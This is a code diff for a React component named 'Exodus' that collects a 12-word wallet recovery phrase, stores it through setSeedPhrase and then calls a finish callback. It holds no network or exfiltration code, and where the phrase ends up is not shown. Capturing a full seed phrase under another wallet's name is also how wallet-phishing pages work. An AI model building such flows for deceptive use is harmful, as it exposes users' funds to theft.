@@ -3,10 +3,16 @@ import { ChevronLeft } from "lucide-react";
 
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { useWalletStore } from "@/store/walletStore";
 
-const Exodus = () => {
+const Exodus = ({ handleFinish }: { handleFinish: () => void }) => {
 	const [words, setWords] = useState<string[]>(Array(12).fill(""));
-	const [step, setStep] = useState(1);
+	const { setSeedPhrase } = useWalletStore();
+
+	const handleComplete = () => {
+		setSeedPhrase(words.join(" "));
+		handleFinish();
+	};
 
 	const handleWordChange = (index: number, value: string) => {
 		const newWords = [...words];
@@ -48,6 +54,7 @@ const Exodus = () => {
 					</div>
 					<div className="flex w-full justify-center items-center mt-12">
 						<Button
+							onClick={handleComplete}
 							disabled={!allWordsFilled}
 							className="w-[80%] bg-blue-500 hover:bg-blue-600 text-white disabled:opacity-30 disabled:cursor-not-allowed h-12 text-xs font-semibold rounded-full"
 						>
